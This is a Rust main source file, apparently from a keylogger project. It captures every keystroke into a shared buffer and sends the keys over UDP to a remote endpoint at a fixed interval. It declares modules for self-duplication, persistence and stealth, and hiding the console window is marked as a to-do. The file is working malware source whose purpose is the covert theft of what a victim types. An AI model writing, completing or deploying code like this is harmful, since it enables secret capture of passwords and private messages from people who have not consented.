use core::time;
use rdev::Key;
use std::env;
use std::net::UdpSocket;
use std::process;
use std::sync::{Arc, Mutex};
use std::thread;

use crate::constants::SEND_INTERVAL_SECS;

mod capture;
mod client;
mod constants;
mod duplication;
mod execution;
mod persistence;
mod stealth;
mod utils;

fn initialize_application() {
    let args: Vec<String> = env::args().collect();
    let current_executable_path = env::current_exe().unwrap();
    let is_duplicate_running = args.len() == 2;

    if !is_duplicate_running {
        if let Ok((old_exe_path, new_exe_path)) = duplication::try_duplicate_itself() {
            // let _ = remove_existing_persistence();
            // let _ = setup_persistence();
            execution::execute_new_instance(&new_exe_path, &old_exe_path);
            process::exit(0);
        }
    }

    // TODO: hide_console_window();
}

fn main() {
    // TODO: initialize_application();

    let socket: UdpSocket = match client::create_socket() {
        Ok(socket) => socket,
        _ => panic!("Could not create socket"),
    };

    let shared_buffer = Arc::new(Mutex::new(Vec::<Key>::new()));

    // Create clones of the buffer for the threads
    let buffer_clone_for_populating = Arc::clone(&shared_buffer);
    let buffer_clone_for_accessing = Arc::clone(&shared_buffer);

    thread::spawn(move || loop {
        {
            let mut buffer = buffer_clone_for_accessing.lock().unwrap();

            if !buffer.is_empty() {
                client::send_buffer_key(&socket, &buffer);
                buffer.clear();
            }
        }

        thread::sleep(time::Duration::from_secs(SEND_INTERVAL_SECS));
        // Mutex automatically unlocks due to Rust's RAII
    });

    capture::listen_to_events(buffer_clone_for_populating);
}
